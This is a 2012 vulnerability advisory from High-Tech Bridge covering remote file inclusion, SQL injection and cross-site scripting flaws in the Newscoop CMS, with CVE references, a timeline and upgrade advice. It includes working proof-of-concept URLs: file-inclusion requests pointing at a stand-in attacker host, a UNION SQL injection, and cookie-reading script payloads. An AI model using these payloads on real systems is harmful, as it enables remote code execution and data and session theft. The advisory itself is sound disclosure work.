@@ -1,0 +1,102 @@
+Advisory ID: HTB23084
+Product: Newscoop
+Vendor: Sourcefabric o.p.s.
+Vulnerable Version(s): 3.5.3 and probably prior, partially 4.0 RC3
+Tested Version: 3.5.3
+Vendor Notification: 28 March 2012 
+Vendor Patch: 5 April 2012 
+Public Disclosure: 18 April 2012 
+Vulnerability Type: Remote File Inclusion, SQL Injection, Cross-Site Scripting (XSS) 
+CVE Reference(s): CVE-2012-1933, CVE-2012-1934, CVE-2012-1935
+Solution Status: Fixed by Vendor
+Risk Level: High 
+Credit: High-Tech Bridge SA Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in Newscoop, which can be exploited to perform Remote File Inclusion, SQL Injection and Cross-Site Scripting (XSS) attacks.
+
+
+1) Multiple Remote File Inclusion in Newscoop: CVE-2012-1933
+
+1.1 Input passed via the "GLOBALS[g_campsiteDir]" GET parameter to /include/phorum_load.php is not properly verified before being used in require_once() function and can be exploited to include arbitrary remote files.
+
+The following PoC (Proof of Concept) demonstrates the vulnerability:
+
+http://[host]/include/phorum_load.php?GLOBALS[g_campsiteDir]=http://attacker.site/file%00
+
+1.2 Input passed via the "GLOBALS[g_campsiteDir]" GET parameter to /conf/install_conf.php is not properly verified before being used in require_once() function and can be exploited to include arbitrary remote files.
+
+The following PoC demonstrates the vulnerability:
+
+http://[host]/conf/install_conf.php?GLOBALS[g_campsiteDir]=http://attacker.site/file%00
+
+1.3 Input passed via the "GLOBALS[g_campsiteDir]" GET parameter to /conf/liveuser_configuration.php is not properly verified before being used in require_once() function and can be exploited to include arbitrary remote files.
+
+The following PoC demonstrates the vulnerability:
+
+http://[host]/conf/liveuser_configuration.php?GLOBALS[g_campsiteDir]=http://attacker.site/file%00
+
+Successful exploitation of these vulnerabilities (1.1 - 1.3) requires that "register_globals" is enabled.
+
+
+2) SQL Injection in Newscoop: CVE-2012-1934
+
+2.1 Input passed via the "f_country_code" GET parameter to /admin/country/edit.php is not properly sanitised before being used in SQL query.
+This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+
+The following PoC (Proof of Concept) demonstrates the vulnerability:
+
+http://[host]/admin/country/edit.php?f_country_code=%27%20union%20select%201,2,version%28%29%20--%202
+
+Successful exploitation of the vulnerability requires attacker to be registered and logged-in and to have permission to manage countries. For successful exploitation "magic_quotes_gpc" should be disabled as well.
+
+
+3) Multiple Cross-Site Scripting (XSS) in Newscoop: CVE-2012-1935
+
+3.1 Input passed via the "Back" GET parameter to /admin/ad.php is not properly sanitised before being returned to the user.
+This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of the affected website.
+
+The following PoC (Proof of Concept) demonstrates the vulnerability:
+
+http://[host]/admin/ad.php?Back=%27%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+3.2 Input passed via the "error_code" GET parameter to /admin/login.php is not properly sanitised before being returned to the user.
+This can be exploited to execute arbitrary HTML and script code in user's browser session in context of the affected website.
+
+The following PoC demonstrates the vulnerability:
+
+http://[host]/admin/login.php?error_code=upgrade&f_user_name=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+3.3 Input passed via the "token" and "f_email" GET parameters to /admin/password_check_token.php is not properly sanitised before being returned to the user.
+This can be exploited to execute arbitrary HTML and script code in user's browser session in context of the affected website.
+
+The following PoC demonstrate the vulnerabilities:
+
+http://[host]/admin/password_check_token.php?token=1&f_email=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://[host]/admin/password_check_token.php?f_email=1&token=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Upgrade to Newscoop 3.5.5
+Make sure that "register_globals" is set to off (fix for CVE-2012-1933)
+
+More Information:
+http://www.sourcefabric.org/en/newscoop/latestrelease/1141/Newscoop-355-and-Newscoop-4-RC4-security-releases.htm
+http://dev.sourcefabric.org/browse/CS-4179
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23084 - https://www.htbridge.ch/advisory/HTB23084 - Multiple vulnerabilities in Newscoop.
+[2] Newscoop - http://www.sourcefabric.org - is an open Content Management System for journalists & online newspapers.
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
